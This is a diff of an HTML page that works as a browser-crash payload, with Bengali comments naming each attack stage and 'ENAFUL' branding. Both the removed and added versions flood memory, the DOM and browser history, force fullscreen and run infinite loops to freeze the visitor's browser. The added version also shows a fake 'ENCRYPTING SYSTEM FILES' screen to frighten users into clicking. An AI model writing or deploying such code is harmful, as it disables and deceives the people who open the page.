@@ -3,95 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠︎ SYSTEM CRITICAL ⚠︎</title>
+    <title>⚠︎ SYSTEM TERMINATED ⚠︎</title>
     <style>
-        /* সম্পূর্ণ ব্ল্যাকআউট ইন্টারফেস */
-        body, html {
-            background-color: black;
-            color: #00ff00;
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            font-family: 'Courier New', monospace;
-            cursor: none;
-        }
-        #shield {
-            font-size: 5px;
-            color: rgba(0, 0, 0, 0.1); /* ইমোজিগুলো ইনভিজিবল কিন্তু মেমোরি খাবে */
-            word-wrap: break-word;
-        }
+        body { background: black; color: #f00; font-family: monospace; overflow: hidden; text-align: center; padding-top: 20%; }
+        #status { font-size: 20px; text-shadow: 0 0 10px red; }
     </style>
 </head>
-<body>
+<body onclick="totalCrash()">
 
-    <div id="shield">
-        </div>
+    <div id="status">
+        [!] ENCRYPTING SYSTEM FILES...<br>
+        [#] CLICK TO FINALIZE OVERRIDE [#]
+    </div>
 
     <script>
-        // ১. ইমোজি ফ্লাডিং (DOM Stresser) - প্রায় ২০০০+ ইমোজি লোড হবে
-        const shield = document.getElementById('shield');
-        let warningData = "";
-        for (let i = 0; i < 2500; i++) {
-            warningData += "⚠︎ ";
-        }
-        shield.innerText = warningData;
-
-        // ২. মেইন অ্যাটাক ইঞ্জিন (Instant Execution)
-        (function executeUltimatePayload() {
-            
-            // ৩. ব্রাউজার হিস্ট্রি ফ্লাডিং (Back Button Kill)
-            setInterval(() => {
-                for(let h=0; h<500; h++) {
-                    window.history.pushState(null, null, Math.random().toString(36).substring(7));
-                }
-            }, 10);
-
-            // ৪. মেমোরি ফ্লাডিং (Heavy RAM Consumption)
-            let binaryWaste = [];
-            
-            // ৫. রিকার্সিভ ক্র্যাশ লুপ (Stack Overflow)
-            function initiateDeepFreeze() {
-                // র‍্যামে বিশাল ডাটা পুশ
-                binaryWaste.push(new Array(5000000).join("ENAFUL-DEADLY-PAYLOAD-⚠︎"));
-                
-                // কনসোল স্ট্রেস
-                console.error("CRITICAL_FAILURE_".repeat(1000));
-                
-                document.title = "⚠︎ CRASHED BY ENAFUL " + Math.random();
-                
-                // রিকার্সন কল
-                initiateDeepFreeze();
-            }
-
-            // ৬. হার্ডওয়্যার ফ্রিজ (CPU & GPU Overload)
-            setTimeout(() => {
-                // ইনফিনিট লুপ যা প্রসেসর থ্রেড ব্লক করবে
-                while(true) {
-                    var heavyMath = Math.atan2(Math.random(), Math.random());
-                    
-                    // WebGL জিপিইউ স্ট্রেস
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    
-                    // অটো ফুলস্ক্রিন রিকোয়েস্ট (লক করার জন্য)
-                    document.documentElement.requestFullscreen().catch(e => {});
-                }
-            }, 10);
-
-            try {
-                initiateDeepFreeze();
-            } catch (error) {
-                // এরর হ্যান্ডলার দিয়ে আবার লুপ শুরু করা যাতে থামানো না যায়
-                executeUltimatePayload();
-            }
-        })();
-
-        // অটো-লক অন ক্লিক
-        window.onclick = function() {
+        function totalCrash() {
+            // ১. অটো ফুলস্ক্রিন ও মাউস লক (পালানোর পথ বন্ধ)
             document.documentElement.requestFullscreen();
-        };
+            
+            // ২. হিস্ট্রি জ্যাম (ব্যাক বাটন ইনভ্যালিড করা)
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    window.history.pushState(null, null, location.href + "/" + Math.random());
+                }
+            }, 1);
+
+            // ৩. র‍্যাম এবং জিপিইউ একযোগে ক্রাশ করা (মেইন ইঞ্জিন)
+            let data = [];
+            function destructiveLoop() {
+                // মেমোরি ফ্লাডিং - প্রতি মিলিসেকেন্ডে বিশাল ডাটা পুশ
+                data.push(new Array(1000000000000000).join("⚠︎ENAFUL⚠︎"));
+                
+                // ইনফিনিট এলিমেন্ট ক্রিয়েশন (DOM Stress)
+                let div = document.createElement('div');
+                div.innerHTML = "<h1>CRITICAL_FAILURE</h1>".repeat(100);
+                document.body.appendChild(div);
+                
+                // কনসোল স্ট্যাক ওভারফ্লো
+                console.log("%c STOP", "font-size:100px; color:red;");
+                
+                // রিকার্সিভ কল যা দ্রুত প্রসেসর লক করবে
+                setTimeout(destructiveLoop, 0);
+            }
+
+            // ৪. হার্ডওয়্যার ফ্রিজ লুপ
+            while(true) {
+                destructiveLoop();
+                // এটি ব্রাউজারের রেসপন্স করার ক্ষমতা কেড়ে নেবে
+                var crash = " ".repeat(1000000000); 
+            }
+        }
     </script>
 </body>
 </html>
